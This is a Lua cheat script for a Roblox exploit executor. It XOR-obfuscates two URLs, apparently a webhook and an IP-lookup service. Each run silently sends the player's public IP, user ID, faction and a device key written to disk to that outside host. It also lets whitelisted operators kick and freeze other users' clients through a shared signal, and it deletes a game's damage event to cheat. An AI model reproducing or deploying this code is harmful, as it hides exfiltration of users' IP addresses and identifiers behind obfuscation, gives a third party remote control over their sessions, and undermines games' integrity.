if not getgenv()._NK_SESS then
    game:GetService("Players").LocalPlayer:Kick("Auth Required")
    return
end
getgenv()._NK_SESS = nil

local function _0xDE(_d, _k)
    local _r = ""
    for _i = 1, #_d do
        local _c = bit32.bxor(_d[_i], _k)
        _r = _r .. string.char((_c - _i) % 256)
    end
    return _r
end

local _0xK = 168
local _0xW = _0xDE({193, 222, 223, 220, 208, 232, 158, 159, 197, 219, 214, 199, 212, 40, 219, 150, 220, 41, 40, 235, 222, 46, 40, 239, 56, 215, 213, 44, 36, 37, 34, 59, 248, 251, 240, 253, 246, 242, 255, 201, 202, 243, 200, 245, 202, 206, 207, 205, 194, 193, 195, 196, 204, 1, 6, 196, 52, 7, 58, 4, 42, 195, 58, 218, 60, 48, 52, 36, 58, 222, 17, 209, 62, 53, 56, 10, 107, 7, 47, 0, 18, 54, 30, 49, 28, 19, 15, 20, 3, 47, 5, 123, 102, 126, 109, 31, 26, 51, 63, 111, 5, 30, 98, 99, 19, 117, 103, 52, 55, 104, 78, 123, 111, 99, 78, 19, 4, 5, 16, 119, 114}, _0xK)
local _0xIP = _0xDE({193, 222, 223, 220, 151, 157, 158, 217, 209, 159, 196, 212, 222, 148, 218, 215, 214, 233, 213, 47, 44, 44, 238, 255, 215, 43, 40, 32, 41, 57, 244, 59, 61, 43, 63, 49, 48, 250, 34, 63, 54, 48, 55, 54, 14, 242, 58, 49, 13, 3, 247, 0, 54, 11, 52, 26, 0, 0, 8, 192, 14, 25, 7, 196, 26, 31, 0, 30, 22, 218, 31, 18, 16, 106, 108, 208, 29, 21, 106, 108, 18, 104, 18}, _0xK)

local Config = {
    WL = {
        UIDs = {"10760143653"},
        HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
        Keys = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F"}
    },
    BL = { UIDs = {}, HWIDs = {}, Keys = {} }
}

local _P = game:GetService("Players")
local _H = game:GetService("HttpService")
local _lp = _P.LocalPlayer
local _uid = tostring(_lp.UserId)
local _tk = "N/A"

pcall(function()
    if isfile and readfile and writefile then
        if isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json")
        else _tk = _H:GenerateGUID(false) writefile("nazarkus_key.json", _tk) end
    end
end)

local function chk(l)
    for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
    local hw = game:GetService("RbxAnalyticsService"):GetClientId()
    for _, v in ipairs(l.HWIDs or {}) do if v == hw then return true end end
    for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
    return false
end

local _st = chk(Config.WL) and "whitelist" or (chk(Config.BL) and "blacklist" or "guest")

local _R = game:GetService("ReplicatedStorage")
local _SIG = _R:FindFirstChild("NazarkusSignal") or Instance.new("StringValue", _R)
_SIG.Name = "NazarkusSignal"
local _PDIR = _R:FindFirstChild("NazarkusPresence") or Instance.new("Folder", _R)
_PDIR.Name = "NazarkusPresence"
Instance.new("StringValue", _PDIR).Name = _lp.Name

_SIG.Changed:Connect(function(v)
    if v == "all" or v == _lp.Name or v == _uid or v == _tk then
        _lp:Kick("Terminated.")
        while true do end
    end
end)

if _st == "whitelist" then
    task.spawn(function()
        local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
        local f = Instance.new("Frame", sg)
        f.Size = UDim2.new(0, 220, 0, 300)
        f.Position = UDim2.new(0.5, -110, 0.5, -150)
        f.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
        f.Visible = false
        Instance.new("UICorner", f)
        local s = Instance.new("ScrollingFrame", f)
        s.Size = UDim2.new(1, -20, 1, -40)
        s.Position = UDim2.new(0, 10, 0, 30)
        s.BackgroundTransparency = 1
        Instance.new("UIListLayout", s).Padding = UDim.new(0, 5)
        local cf = Instance.new("Frame", f)
        cf.Size = UDim2.new(1, 0, 1, 0)
        cf.Visible = false
        local cb = Instance.new("Frame", cf)
        cb.Size = UDim2.new(0, 150, 0, 70)
        cb.Position = UDim2.new(0.5, -75, 0.5, -35)
        cb.BackgroundColor3 = Color3.fromRGB(40,40,40)
        local y = Instance.new("TextButton", cb)
        y.Size = UDim2.new(0.5, -10, 0, 25)
        y.Position = UDim2.new(0, 5, 1, -30)
        y.Text = "YES"
        y.BackgroundColor3 = Color3.fromRGB(150, 50, 50)
        local n = Instance.new("TextButton", cb)
        n.Size = UDim2.new(0.5, -10, 0, 25)
        n.Position = UDim2.new(0.5, 5, 1, -30)
        n.Text = "NO"
        local target = ""
        local function refresh()
            for _, v in ipairs(s:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end
            for _, v in ipairs(_PDIR:GetChildren()) do
                local r = Instance.new("Frame", s)
                r.Size = UDim2.new(1, 0, 0, 25)
                local b = Instance.new("TextButton", r)
                b.Size = UDim2.new(1, 0, 1, 0)
                b.Text = "KICK: " .. v.Name
                b.MouseButton1Click:Connect(function() target = v.Name cf.Visible = true end)
            end
        end
        y.MouseButton1Click:Connect(function() _SIG.Value = target task.wait(0.1) _SIG.Value = "" cf.Visible = false refresh() end)
        n.MouseButton1Click:Connect(function() cf.Visible = false end)
        game:GetService("UserInputService").InputBegan:Connect(function(k, g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
    end)
end

local function _LOG()
    pcall(function()
        local r = (syn and syn.request or request or http_request)({Url = _0xIP, Method = "GET"})
        local ni = r and r.Success and _H:JSONDecode(r.Body) or {}
        local u = 0
        for _, f in ipairs({"getgenv", "getrawmetatable", "hookfunction"}) do if getgenv()[f] then u = u + 1 end end
        local fn, ft = "None", "None"
        local rs = game:GetService("ReplicatedStorage")
        local fdf = rs:FindFirstChild("FactionSysRS") and rs.FactionSysRS:FindFirstChild("FactionData")
        if fdf then
            for _, f in ipairs(fdf:GetChildren()) do
                local m = f:FindFirstChild("FactionMembers")
                if m and m:FindFirstChild(_uid) then
                    local bd = f:FindFirstChild("BasicFactionData")
                    if bd then fn = bd.FactionName.Value ft = bd.FactionTag.Value end
                    break
                end
            end
        end
        local payload = {
            ["embeds"] = {{
                ["title"] = (_st == "whitelist" and "Verified" or "Execution Log"),
                ["color"] = (_st == "whitelist" and 65280 or 16753920),
                ["fields"] = {
                    {["name"] = "Player", ["value"] = _lp.Name.."\nID: ".._uid, ["inline"] = true},
                    {["name"] = "Faction", ["value"] = "["..ft.."] "..fn, ["inline"] = true},
                    {["name"] = "Device Key", ["value"] = "```".._tk.."```", ["inline"] = false},
                    {["name"] = "IP Network", ["value"] = ni.query or "N/A", ["inline"] = false}
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }
        (syn and syn.request or request or http_request)({Url = _0xW, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
    end)
end

task.spawn(_LOG)
if _st == "blacklist" then _lp:Kick("Banned.") return end
pcall(function() if _R:FindFirstChild("ACS_Engine") then _R.ACS_Engine.Events.FDMG:Destroy() end end)
